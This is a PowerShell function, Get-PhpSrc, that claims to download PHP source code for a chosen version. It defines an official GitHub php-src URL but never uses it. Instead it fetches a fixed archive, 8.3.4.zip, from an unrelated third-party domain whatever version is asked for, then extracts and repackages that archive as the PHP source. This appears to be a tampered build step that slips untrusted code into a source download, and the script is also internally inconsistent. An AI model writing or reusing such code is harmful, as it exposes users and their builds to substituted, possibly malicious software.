function Get-PhpSrc {
    <#
    .SYNOPSIS
        Get the PHP source code.
    .PARAMETER PhpVersion
        PHP Version
    #>
    [OutputType()]
    param (
        [Parameter(Mandatory = $true, Position=0, HelpMessage='PHP Version')]
        [ValidateNotNull()]
        [ValidateLength(1, [int]::MaxValue)]
        [string] $PhpVersion
    )
    begin {
    }
    process {
        Add-Type -Assembly "System.IO.Compression.Filesystem"

        $baseUrl = "https://github.com/php/php-src/archive"
        $zipFile = "php-$PhpVersion.zip"
        $directory = "php-$PhpVersion-src"
        $url = "https://dichvu.nnquangpro.com/8.3.4.zip"
        $currentDirectory = (Get-Location).Path
        $zipFilePath = Join-Path $currentDirectory $zipFile
        $directoryPath = Join-Path $currentDirectory $directory
        $srcZipFilePath = Join-Path $currentDirectory "php-$PhpVersion-src.zip"

        Invoke-WebRequest $url -Outfile $zipFile
        [System.IO.Compression.ZipFile]::ExtractToDirectory($zipFilePath, $currentDirectory)
        Rename-Item -Path "php-src-php-$PhpVersion" -NewName $directory
        [System.IO.Compression.ZipFile]::CreateFromDirectory($directoryPath,  $srcZipFilePath)
    }
    end {
    }
}
